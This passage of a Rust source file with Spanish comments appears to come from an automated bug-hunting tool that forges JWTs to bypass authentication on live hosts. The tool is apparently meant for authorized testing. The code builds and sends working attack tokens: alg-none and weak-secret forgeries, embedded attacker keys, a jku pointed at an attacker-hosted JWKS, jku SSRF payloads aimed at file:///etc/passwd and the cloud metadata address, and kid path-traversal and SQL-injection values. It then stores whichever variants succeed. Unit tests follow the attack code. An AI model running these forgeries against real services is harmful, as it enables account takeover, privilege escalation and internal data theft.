            // (Authlib `key=None`), valida. Una variante por escalada.
            let k_b64 = base64url_encode(ATACANTE_OCT_KEY);
            for esc in escaladas() {
                let payload = mutar_payload(&jwt.payload, &esc);
                let header = serde_json::json!({
                    "alg": "HS256", "typ": "JWT",
                    "jwk": {"kty": "oct", "k": k_b64},
                });
                let tok = forjar_hs256_con_header(&header, &payload, ATACANTE_OCT_KEY);
                out.push((format!("jwk-embebido/oct/{}", etiqueta_esc(&esc)), tok));
            }
        }
        MoldeAuth::SecretoDebil => {
            // OFFLINE: solo si el token original es HS* Y su secreto está en el diccionario.
            // Cero tráfico al objetivo hasta aquí; si no casa, 0 variantes (no se inventa).
            if jwt.alg.to_ascii_uppercase().starts_with("HS") {
                let original = format!("{}.{}.{}", jwt.header_b64, jwt.payload_b64, jwt.sig_b64);
                if let Some(sec) = DICCIONARIO_SECRETOS.iter().find(|s| verificar_hs256(&original, s.as_bytes())) {
                    for esc in escaladas() {
                        let payload = mutar_payload(&jwt.payload, &esc);
                        let tok = forjar_hs256(&payload, sec.as_bytes());
                        out.push((format!("secreto-debil/{sec}/{}", etiqueta_esc(&esc)), tok));
                    }
                }
            }
        }
        MoldeAuth::JkuSsrf => {
            // Muta SOLO el header (jku), conserva payload+firma originales: el ataque es que el
            // server FETCHEE la URL, no que el token valide. `OOB_CANARY` lo sustituye el
            // verificador SSRF-OOB en vivo. No se itera por escalada (la identidad es irrelevante
            // para el fetch).
            for (tk, jku) in [
                ("file", "file:///etc/passwd"),
                ("metadata", "http://169.254.169.254/latest/meta-data/"),
                ("oob", "http://OOB_CANARY/.well-known/jwks.json"),
            ] {
                let header = serde_json::json!({"alg": jwt.alg, "typ": "JWT", "jku": jku});
                let h = base64url_encode(header.to_string().as_bytes());
                out.push((format!("jku-ssrf/{tk}"), format!("{h}.{}.{}", jwt.payload_b64, jwt.sig_b64)));
            }
        }
        MoldeAuth::JwkEmbebidoRsa => {
            // jwk RSA incrustado + RS256 firmado con NUESTRA clave RSA. Self-contained (la pubkey
            // viaja en el token) → confirmable por el oráculo de aceptación.
            for esc in escaladas() {
                let payload = mutar_payload(&jwt.payload, &esc);
                let header = serde_json::json!({"alg": "RS256", "typ": "JWT", "jwk": jwk_rsa_atacante()});
                if let Some(tok) = forjar_rs256_con_header(&header, &payload) {
                    out.push((format!("jwk-embebido-rsa/{}", etiqueta_esc(&esc)), tok));
                }
            }
        }
        MoldeAuth::JkuAtacante => {
            // jku → JWKS que hospedamos (clave RSA propia). `OOB_CANARY` lo sustituye el
            // verificador en vivo por la URL real del JWKS. Oráculo de aceptación, pero necesita
            // la infra de hospedaje → no entra en el bucle de forja por defecto.
            for esc in escaladas() {
                let payload = mutar_payload(&jwt.payload, &esc);
                let header = serde_json::json!({
                    "alg": "RS256", "typ": "JWT", "kid": "nexus",
                    "jku": "https://OOB_CANARY/.well-known/jwks.json",
                });
                if let Some(tok) = forjar_rs256_con_header(&header, &payload) {
                    out.push((format!("jku-atacante/{}", etiqueta_esc(&esc)), tok));
                }
            }
        }
        MoldeAuth::KidInjection => {
            // (a) path traversal a un archivo de contenido conocido-vacío (/dev/null) → el server
            //     deriva una clave VACÍA → HMAC con "". (b) SQLi en el lookup del kid → el UNION
            //     devuelve una clave que controlamos → HMAC con esa clave.
            for esc in escaladas() {
                let payload = mutar_payload(&jwt.payload, &esc);
                let casos: [(&str, &str, &[u8]); 2] = [
                    ("traversal-devnull", "../../../../../../dev/null", b""),
                    ("sqli-union", "nexus' UNION SELECT 'nexuskey", b"nexuskey"),
                ];
                for (tk, kid, key) in casos {
                    let header = serde_json::json!({"alg": "HS256", "typ": "JWT", "kid": kid});
                    let tok = forjar_hs256_con_header(&header, &payload, key);
                    out.push((format!("kid-injection/{tk}/{}", etiqueta_esc(&esc)), tok));
                }
            }
        }
        MoldeAuth::ConfusionClaveCero => {
            // JWK RSA sin `alg` → HMAC con clave de longitud CERO (LibJWT). Variantes: "" y NUL.
            for esc in escaladas() {
                let payload = mutar_payload(&jwt.payload, &esc);
                out.push((format!("clave-cero/vacia/{}", etiqueta_esc(&esc)), forjar_hs256(&payload, b"")));
                out.push((format!("clave-cero/nul/{}", etiqueta_esc(&esc)), forjar_hs256(&payload, b"\0")));
            }
        }
    }
    out
}

/// El bypass que el oráculo confirmó, con su evidencia mínima.
#[derive(Debug, Clone)]
pub struct BypassConfirmado {
    pub molde: String,
    pub tecnica: String,
    pub token: String,
    pub status: u16,
}

/// Resultado del ciclo adaptativo de auth para UN host.
#[derive(Debug, Clone)]
pub struct ResultadoAuth {
    pub senal: SenalAuth,
    pub variantes_probadas: usize,
    pub bypass: Option<BypassConfirmado>,
    pub desde_memoria: bool,
}

/// Transporte del ataque a auth: envía un token al endpoint y devuelve (status, cuerpo). La
/// implementa el arnés (reqwest→localhost) y el cazador real (fetch_evasion→WAF). GET no
/// destructivo con NUESTRA identidad de prueba (estatuto detector).
#[allow(async_fn_in_trait)]
pub trait SondaAuth {
    async fn probar(&self, token: &str) -> (u16, String);
    /// La misma petición SIN cabecera de autorización. Distingue "recurso público" (pasa sin
    /// token) de "token exigido pero firma NO verificada" (rechaza sin token, acepta un token
    /// de firma basura) — que es CWE-347 en su forma más simple, y se perdería si el control
    /// aceptado se leyera siempre como "no hay sink" (hallazgo de la revisión, 2026-08-25).
    async fn probar_sin_auth(&self) -> (u16, String);
}

/// EL CICLO ADAPTATIVO DE AUTH para un host: control barato → (si sink defendido) memoria →
/// transcribir moldes → oráculo limpio → SIEMBRA la variante ganadora en `secuencias`. Sin
/// sink defendido, 0 variantes (poda). Devuelve qué pasó, con evidencia.
pub async fn ciclo_auth<S: SondaAuth>(
    pool: &sqlx::SqlitePool,
    program: &str,
    host: &str,
    jwt_muestra: &Jwt,
    claves_confusion: &[Vec<u8>],
    moldes: &[MoldeAuth],
    sonda: &S,
) -> crate::error::Result<ResultadoAuth> {
    // 0a) SIN TOKEN: mide si el recurso exige autenticación. Si pasa sin token, es PÚBLICO —
    //     no hay sink, y ninguna forja significaría nada (poda, 0-rápido-verdadero).
    let (status_sin_token, _) = sonda.probar_sin_auth().await;
    if matches!(status_sin_token, 200..=299) {
        return Ok(ResultadoAuth {
            senal: SenalAuth::SinSink,
            variantes_probadas: 0,
            bypass: None,
            desde_memoria: false,
        });
    }

    // 0b) CONTROL: token bien formado con FIRMA INVÁLIDA. Contra un no-token rechazado, su
    //     resultado separa tres mundos:
    //       - control ACEPTADO (2xx)  → la firma NO se verifica: es CWE-347 en su forma más
    //         simple, y es EL hallazgo (un token de firma basura pasó donde no-token no).
    //       - control 401/403         → hay verificación de firma: sink DEFENDIDO, a forjar.
    //       - otra cosa (5xx/redirect)→ no se puede determinar: poda sin afirmar nada (dir. 30).
    let control = format!("{}.{}.c2lnLWludmFsaWRh", jwt_muestra.header_b64, jwt_muestra.payload_b64);
    let (status_control, cuerpo_control) = sonda.probar(&control).await;

    // Huella de la postura (por el status sin-token: es la señal más limpia de la defensa).
    let postura = crate::secuencias::PosturaDefensa {
        status_no_auth: status_sin_token,
        es_challenge: false,
        familia_waf: None,
        amuralla_ip: false,
        cabeceras_seguridad: Vec::new(),
    };
    let huella = postura.huella();

    // FIRMA NO VERIFICADA: no-token rechazado + token de firma basura ACEPTADO. El propio
    // control ES la prueba; no hace falta forjar alg:none/confusión.
    if es_bypass_confirmado(status_sin_token, status_control, &cuerpo_control) {
        let mut params = std::collections::BTreeMap::new();
        params.insert("token".to_string(), control.clone());
        let mutacion = crate::secuencias::Mutacion {
            familia: FAMILIA_AUTH.to_string(),
            tecnica: "firma-no-verificada".to_string(),
            parametros: params,
        };
        if let Some(orac) = crate::secuencias::OraculoConfirmado::desde_ejecucion(true) {
            let _ = crate::secuencias::guardar(pool, &orac, program, host, &huella, &mutacion, None, None).await;
        }
        return Ok(ResultadoAuth {
            senal: SenalAuth::SinkDefendido,
            variantes_probadas: 1,
            bypass: Some(BypassConfirmado {
                molde: "firma-no-verificada".to_string(),
                tecnica: "firma-no-verificada".to_string(),
                token: control,
                status: status_control,
            }),
            desde_memoria: false,
        });
    }

    // Sin firma-no-verificada: solo seguimos si hay verificación de firma (control rechazado).
    if clasificar_sink_auth(status_control) == SenalAuth::SinSink {
        return Ok(ResultadoAuth {
            senal: SenalAuth::SinSink,
            variantes_probadas: 0,
            bypass: None,
            desde_memoria: false,
        });
    }

    // Llegados aquí: no-token rechazado Y control (firma basura) rechazado → hay verificación
    // de firma de verdad. Sink DEFENDIDO: a transcribir moldes.
    let senal = SenalAuth::SinkDefendido;

    // 1) MEMORIA primero (enviar preciso/estrecho): ¿ya sabemos qué variante aterrizó aquí?
    for sec in crate::secuencias::recuperar(pool, host, FAMILIA_AUTH, &huella).await? {
        if let Some(tok) = sec.mutacion.parametros.get("token") {
            let (st, cuerpo) = sonda.probar(tok).await;
            if es_bypass_confirmado(status_control, st, &cuerpo) {
                if let Some(orac) = crate::secuencias::OraculoConfirmado::desde_ejecucion(true) {
                    let _ = crate::secuencias::guardar(
                        pool, &orac, program, host, &huella, &sec.mutacion, None, None,
                    )
                    .await;
                }
                return Ok(ResultadoAuth {
                    senal,
                    variantes_probadas: 1,
                    bypass: Some(BypassConfirmado {
                        molde: "memoria".into(),
                        tecnica: sec.mutacion.tecnica.clone(),
                        token: tok.clone(),
                        status: st,
                    }),
                    desde_memoria: true,
                });
            }
        }
    }

    // 2) TRANSCRIBIR moldes → variantes, y probar SOLO aquí (sink defendido).
    let mut probadas = 0usize;
    for &molde in moldes {
        for (tecnica, token) in transcribir(molde, jwt_muestra, claves_confusion) {
            probadas += 1;
            let (st, cuerpo) = sonda.probar(&token).await;
            if es_bypass_confirmado(status_control, st, &cuerpo) {
                // SIEMBRA la variante ganadora como memoria PROPIA (no el molde ajeno).
                let mut params = std::collections::BTreeMap::new();
                params.insert("token".to_string(), token.clone());
                let mutacion = crate::secuencias::Mutacion {
                    familia: FAMILIA_AUTH.to_string(),
                    tecnica: tecnica.clone(),
                    parametros: params,
                };
                if let Some(orac) = crate::secuencias::OraculoConfirmado::desde_ejecucion(true) {
                    let _ = crate::secuencias::guardar(
                        pool, &orac, program, host, &huella, &mutacion, None, None,
                    )
                    .await;
                }
                return Ok(ResultadoAuth {
                    senal,
                    variantes_probadas: probadas,
                    bypass: Some(BypassConfirmado {
                        molde: molde.nombre().to_string(),
                        tecnica,
                        token,
                        status: st,
                    }),
                    desde_memoria: false,
                });
            }
        }
    }
    Ok(ResultadoAuth { senal, variantes_probadas: probadas, bypass: None, desde_memoria: false })
}

#[cfg(test)]
mod tests {
    use super::*;

    // Un JWT de juguete: header {"alg":"HS256","kid":"k1"}, payload {"sub":"user","role":"user"}.
    // Construido a mano en base64url (sin firma real — capa 0 solo parsea).
    fn jwt_muestra() -> String {
        // {"alg":"HS256","typ":"JWT","kid":"k1"}
        let h = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0";
        // {"sub":"user","role":"user"}
        let p = "eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ";
        format!("{h}.{p}.ZmFrZXNpZw")
    }

    #[test]
    fn base64url_decode_ok_y_rechaza_basura() {
        assert_eq!(base64url_decode("aGVsbG8").unwrap(), b"hello"); // "hello" sin padding
        assert_eq!(base64url_decode("Zm9vYmFy").unwrap(), b"foobar");
        // ROJO (pareja): un carácter fuera del alfabeto base64url → None.
        assert!(base64url_decode("no!valido").is_none());
    }

    #[test]
    fn parse_jwt_extrae_alg_kid_y_payload() {
        let j = parse_jwt(&jwt_muestra()).unwrap();
        assert_eq!(j.alg, "HS256");
        assert_eq!(j.kid.as_deref(), Some("k1"));
        assert_eq!(j.payload["role"], "user");
        // Tolera el prefijo "Bearer ".
        assert!(parse_jwt(&format!("Bearer {}", jwt_muestra())).is_some());
    }

    #[test]
    fn parse_jwt_rechaza_no_jwt() {
        // ROJO (pareja, dir. 33): cosas que NO son JWT no deben parsear.
        assert!(parse_jwt("solo-un-string").is_none()); // sin puntos
        assert!(parse_jwt("a.b").is_none()); // 2 segmentos
        assert!(parse_jwt("aaa.bbb.ccc").is_none()); // header no es JSON válido
        // 3 segmentos, header JSON PERO sin `alg` → no es JWT.
        // {"typ":"JWT"} = eyJ0eXAiOiJKV1QifQ
        assert!(parse_jwt("eyJ0eXAiOiJKV1QifQ.eyJhIjoxfQ.sig").is_none());
    }

    #[test]
    fn detecta_jwt_en_cookie_y_en_www_authenticate() {
        let jwt = jwt_muestra();
        let cabs = vec![("set-cookie".to_string(), format!("auth={jwt}; HttpOnly; Path=/"))];
        assert_eq!(detectar_mecanismo(&cabs, ""), Mecanismo::Jwt);
        let cabs2 = vec![("www-authenticate".to_string(), "Bearer realm=\"api\"".to_string())];
        assert_eq!(detectar_mecanismo(&cabs2, ""), Mecanismo::Jwt);
    }

    #[test]
    fn base64url_roundtrip() {
        for s in [&b"hello"[..], b"foobar", b"{\"alg\":\"none\"}", &[0u8, 255, 128, 1]] {
            assert_eq!(base64url_decode(&base64url_encode(s)).unwrap(), s);
        }
    }

    #[test]
    fn hmac_sha256_casa_vector_conocido_rfc4231() {
        // RFC 4231, Test Case 2: prueba que NUESTRO HMAC == el HMAC del mundo. Sin esto,
        // el roundtrip solo probaría auto-consistencia y un bug daría falsos negativos
        // contra servidores reales (dir. 16/33: medir contra el artefacto real).
        let mac = hmac_sha256(b"Jefe", b"what do ya want for nothing?");
        let hex: String = mac.iter().map(|b| format!("{b:02x}")).collect();
        assert_eq!(hex, "5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843");
    }

    #[test]
    fn hs256_firma_verifica_y_discrimina_secreto() {
        let t = forjar_hs256(&serde_json::json!({"sub":"admin"}), b"secreto123");
        // VERDE: verifica con el secreto correcto.
        assert!(verificar_hs256(&t, b"secreto123"));
        // ROJO (pareja, dir. 33): con OTRO secreto NO verifica — si esto pasara, el brute
        // de secreto débil daría falsos positivos (cualquier secreto "valdría").
        assert!(!verificar_hs256(&t, b"secreto-incorrecto"));
        assert!(!verificar_hs256(&t, b""));
    }

    #[test]
    fn brute_de_secreto_debil_encuentra_el_real() {
        // Un token firmado con un secreto débil típico.
        let t = forjar_hs256(&serde_json::json!({"role":"user"}), b"secret");
        let dic = ["password", "123456", "secret", "changeme"];
        let hallado = dic.iter().find(|s| verificar_hs256(&t, s.as_bytes()));
        assert_eq!(hallado, Some(&"secret")); // lo encuentra, y solo ese
    }

    #[test]
    fn ataques_aplicables_segun_alg() {
        let hs = parse_jwt(&jwt_muestra()).unwrap(); // HS256
        let a = ataques_aplicables(&hs, false);
        assert!(a.contains(&AtaqueJwt::AlgNone) && a.contains(&AtaqueJwt::SecretoDebil));
        assert!(!a.contains(&AtaqueJwt::ConfusionAlg)); // HS no sufre confusión
        // Un RS256 con pubkey conocida → confusión aplica; sin pubkey, no.
        let mut rs = hs;
        rs.alg = "RS256".into();
        assert!(ataques_aplicables(&rs, true).contains(&AtaqueJwt::ConfusionAlg));
        assert!(!ataques_aplicables(&rs, false).contains(&AtaqueJwt::ConfusionAlg));
    }

    #[test]
    fn forjar_alg_none_muta_identidad_y_vacia_firma() {
        let payload = serde_json::json!({"sub":"user","role":"user"});
        let mutado = mutar_payload(&payload, &[("role", serde_json::json!("admin"))]);
        let variantes = forjar_alg_none(&mutado);
        assert_eq!(variantes.len(), 4); // none/None/NONE/nOnE
        for v in &variantes {
            assert!(v.ends_with('.'), "firma vacía");
            let j = parse_jwt(v).unwrap();
            assert_eq!(j.alg.to_ascii_lowercase(), "none");
            assert_eq!(j.payload["role"], "admin"); // identidad escalada
        }
    }

    #[test]
    fn oraculo_bypass_discrimina() {
        // ROJO: control (inválido) rechazado 401, forjado aceptado 200 con datos → BYPASS.
        assert!(es_bypass_confirmado(401, 200, "{\"user\":\"admin\",\"balance\":100}"));
        // VERDE (no es bypass): el control TAMBIÉN pasa → endpoint público, no exige auth.
        assert!(!es_bypass_confirmado(200, 200, "{\"data\":1}"));
        // VERDE: forjado rechazado igual → el ataque no funcionó.
        assert!(!es_bypass_confirmado(401, 401, "{\"error\":\"invalid_token\"}"));
        // VERDE: 200 pero cuerpo es error de auth encubierto → no es bypass real.
        assert!(!es_bypass_confirmado(401, 200, "{\"error\":\"invalid_token\"}"));
    }

    #[test]
    fn detecta_sesion_oauth_login_y_desconocido() {
        // Sesión (cookie opaca conocida, NO jwt).
        let ses = vec![("set-cookie".to_string(), "JSESSIONID=ABC123XYZ; Path=/".to_string())];
        assert_eq!(detectar_mecanismo(&ses, ""), Mecanismo::SesionCookie);
        // OAuth por Location del redirect.
        let oa = vec![("location".to_string(),
            "https://idp.x.com/oauth/authorize?client_id=1&redirect_uri=https://a.com/cb&response_type=code&state=s".to_string())];
        assert_eq!(detectar_mecanismo(&oa, ""), Mecanismo::OAuth);
        // Login form en el cuerpo.
        assert_eq!(detectar_mecanismo(&[], "<form><input type=\"password\"></form>"), Mecanismo::LoginForm);
        // Desconocido: nada casa → no se inventa (dir. 20).
        assert_eq!(detectar_mecanismo(&[("server".to_string(), "nginx".to_string())], "<html>hola</html>"), Mecanismo::Desconocido);
        // DISCRIMINA: una cookie de sesión que además es JWT gana JWT (señal más específica).
        let mixto = vec![("set-cookie".to_string(), format!("session={}; Path=/", jwt_muestra()))];
        assert_eq!(detectar_mecanismo(&mixto, ""), Mecanismo::Jwt);
    }

    // Verifica RS256 de un token re-firmando su signing-input y comparando con su firma: lo que
    // un server con NUESTRA pubkey aceptaría. PKCS#1 v1.5 es determinista, así que la igualdad de
    // firmas equivale a la verificación. Es el oráculo REAL contra el que fallan los rojos (D33).
    fn verifica_rs256_con_atacante(token: &str) -> bool {
        let p: Vec<&str> = token.split('.').collect();
        if p.len() != 3 {
            return false;
        }
        let Some(sig) = base64url_decode(p[2]) else { return false };
        let Some(esperada) = firmar_rs256(format!("{}.{}", p[0], p[1]).as_bytes()) else { return false };
        sig == esperada
    }

    #[test]
    fn rs256_roundtrip_firma_y_verifica() {
        let h = serde_json::json!({"alg": "RS256", "typ": "JWT"});
        let tok = forjar_rs256_con_header(&h, &serde_json::json!({"sub": "admin"})).unwrap();
        assert!(verifica_rs256_con_atacante(&tok)); // VERDE
        // ROJO (pareja, dir. 33): cambiar el payload tras firmar invalida la firma RSA.
        let p: Vec<&str> = tok.split('.').collect();
        let otro = format!("{}.{}.{}", p[0], base64url_encode(b"{\"sub\":\"x\"}"), p[2]);
        assert!(!verifica_rs256_con_atacante(&otro));
    }

    #[test]
    fn transcribir_jwk_rsa_firma_con_pubkey_incrustada() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let vs = transcribir(MoldeAuth::JwkEmbebidoRsa, &jwt, &[]);
        assert_eq!(vs.len(), escaladas().len());
        for (_, tok) in &vs {
            // VERDE: verifica con la pubkey RSA que lleva incrustada; el header la declara RS256.
            assert!(verifica_rs256_con_atacante(tok));
            assert_eq!(header_de(tok)["alg"], "RS256");
            assert_eq!(header_de(tok)["jwk"]["kty"], "RSA");
            assert_eq!(header_de(tok)["jwk"]["n"], ATACANTE_RSA_N);
        }
        assert_eq!(parse_jwt(&vs[0].1).unwrap().payload["role"], "admin");
        // ROJO (pareja): firma corrompida → no verifica (si pasara, cualquier token "valdría").
        assert!(!verifica_rs256_con_atacante(&format!("{}x", vs[0].1)));
    }

    #[test]
    fn transcribir_jku_atacante_rs256_y_jku_a_nuestro_jwks() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let vs = transcribir(MoldeAuth::JkuAtacante, &jwt, &[]);
        assert_eq!(vs.len(), escaladas().len());
        let (_, tok) = &vs[0];
        // VERDE: RS256 verificable con NUESTRA pubkey (la que el JWKS hospedado serviría), y el
        // header apunta `jku` a ese JWKS.
        assert!(verifica_rs256_con_atacante(tok));
        assert!(header_de(tok)["jku"].as_str().unwrap().contains("jwks.json"));
        // ROJO (pareja): firma corrompida → no verifica.
        assert!(!verifica_rs256_con_atacante(&format!("{tok}x")));
    }

    #[test]
    fn helpers_live_jku_portan_el_callback_concreto() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let url = "http://1.2.3.4:8004/abc123def456ghij/.well-known/jwks.json";
        // JkuSsrf: el jku concreto viaja en el header y payload+firma ORIGINALES se conservan.
        let s = forjar_jku_ssrf(&jwt, url);
        let js = parse_jwt(&s).unwrap();
        assert_eq!(js.jku.as_deref(), Some(url));
        assert_eq!(js.payload_b64, jwt.payload_b64);
        assert_eq!(js.sig_b64, jwt.sig_b64);
        // JkuAtacante: RS256 verificable con nuestra clave, jku concreto, rol escalado.
        let a = forjar_jku_atacante(&jwt, url, &[("role", serde_json::json!("admin"))]).unwrap();
        assert!(verifica_rs256_con_atacante(&a));
        let ja = parse_jwt(&a).unwrap();
        assert_eq!(ja.jku.as_deref(), Some(url));
        assert_eq!(ja.payload["role"], "admin");
        // ROJO (pareja): payload manipulado tras firmar → no verifica.
        let p: Vec<&str> = a.split('.').collect();
        assert!(!verifica_rs256_con_atacante(&format!("{}.{}.{}", p[0], base64url_encode(b"{\"role\":\"x\"}"), p[2])));
    }

    #[test]
    fn jwks_atacante_json_publica_nuestra_pubkey() {
        let v: serde_json::Value = serde_json::from_str(&jwks_atacante_json()).unwrap();
        // El set lleva UNA clave RSA con NUESTRO n/e — lo que el objetivo traería por `jku`.
        assert_eq!(v["keys"][0]["kty"], "RSA");
        assert_eq!(v["keys"][0]["n"], ATACANTE_RSA_N);
        assert_eq!(v["keys"][0]["e"], ATACANTE_RSA_E);
    }

    // Decodifica el header de un token forjado (para inspeccionar jwk/kid/jku en los tests).
    fn header_de(token: &str) -> serde_json::Value {
        let hb64 = parse_jwt(token).unwrap().header_b64;
        serde_json::from_slice(&base64url_decode(&hb64).unwrap()).unwrap()
    }

    #[test]
    fn transcribir_jwk_embebido_valida_con_la_clave_incrustada() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let vs = transcribir(MoldeAuth::JwkEmbebido, &jwt, &[]);
        assert_eq!(vs.len(), escaladas().len());
        for (_, tok) in &vs {
            // VERDE: el token valida con la clave oct incrustada (el server que confía en la
            // jwk del header lo aceptaría); y el header LLEVA esa jwk.
            assert!(verificar_hs256(tok, ATACANTE_OCT_KEY));
            assert_eq!(header_de(tok)["jwk"]["kty"], "oct");
        }
        // La primera escalada es role=admin.
        assert_eq!(parse_jwt(&vs[0].1).unwrap().payload["role"], "admin");
        // ROJO (pareja, dir. 33): NO valida con otra clave — si validara con cualquiera, el
        // "forjado aceptado" del oráculo no probaría que el server usó NUESTRA jwk.
        assert!(!verificar_hs256(&vs[0].1, b"otra-clave"));
    }

    #[test]
    fn transcribir_secreto_debil_solo_si_el_secreto_es_debil() {
        // VERDE: token firmado con un secreto del diccionario → forja variantes válidas con él.
        let debil = forjar_hs256(&serde_json::json!({"sub":"user","role":"user"}), b"secret");
        let vs = transcribir(MoldeAuth::SecretoDebil, &parse_jwt(&debil).unwrap(), &[]);
        assert_eq!(vs.len(), escaladas().len());
        for (_, tok) in &vs {
            assert!(verificar_hs256(tok, b"secret"));
        }
        // ROJO (pareja, dir. 33): secreto FUERTE (no en el diccionario) → 0 variantes. Si
        // produjera algo, estaría fabricando forjas que el server rechazaría (falso positivo).
        let fuerte = forjar_hs256(&serde_json::json!({"sub":"user"}), b"secreto-largo-aleatorio-no-adivinable-9f3a7c21");
        assert!(transcribir(MoldeAuth::SecretoDebil, &parse_jwt(&fuerte).unwrap(), &[]).is_empty());
    }

    #[test]
    fn transcribir_kid_injection_traversal_y_sqli() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let vs = transcribir(MoldeAuth::KidInjection, &jwt, &[]);
        assert_eq!(vs.len(), escaladas().len() * 2);
        // VERDE: traversal a /dev/null valida con clave VACÍA; SQLi con la clave inyectada.
        let trav = vs.iter().find(|(t, _)| t.contains("traversal-devnull")).unwrap();
        assert!(verificar_hs256(&trav.1, b""));
        let sqli = vs.iter().find(|(t, _)| t.contains("sqli-union")).unwrap();
        assert!(verificar_hs256(&sqli.1, b"nexuskey"));
        // El payload de inyección viaja en el header `kid`.
        assert!(header_de(&sqli.1)["kid"].as_str().unwrap().contains("UNION SELECT"));
        // ROJO (pareja): la traversal NO valida con una clave no-vacía.
        assert!(!verificar_hs256(&trav.1, b"x"));
    }

    #[test]
    fn transcribir_clave_cero_valida_con_clave_vacia() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let vs = transcribir(MoldeAuth::ConfusionClaveCero, &jwt, &[]);
        assert_eq!(vs.len(), escaladas().len() * 2);
        let vacia = vs.iter().find(|(t, _)| t.contains("clave-cero/vacia")).unwrap();
        assert!(verificar_hs256(&vacia.1, b"")); // VERDE: clave de longitud cero
        // ROJO (pareja): NO valida con clave no-vacía — discrimina del caso ya-firmado.
        assert!(!verificar_hs256(&vacia.1, b"no-vacia"));
    }

    #[test]
    fn transcribir_jku_ssrf_muta_header_conserva_payload_y_firma() {
        let jwt = parse_jwt(&jwt_muestra()).unwrap();
        let vs = transcribir(MoldeAuth::JkuSsrf, &jwt, &[]);
        assert_eq!(vs.len(), 3);
        let file = vs.iter().find(|(t, _)| t.ends_with("/file")).unwrap();
        let j = parse_jwt(&file.1).unwrap();
        // VERDE: el jku malicioso viaja en el header, y payload+firma ORIGINALES se conservan
        // (el ataque es que el server FETCHEE la URL, no que el token valide).
        assert_eq!(j.jku.as_deref(), Some("file:///etc/passwd"));
        assert_eq!(j.payload_b64, jwt.payload_b64);
        assert_eq!(j.sig_b64, jwt.sig_b64);
        // ROJO (pareja): el jku NO quedó vacío/benigno — si lo fuera, no habría SSRF.
        assert_ne!(j.jku.as_deref(), Some(""));
    }
}
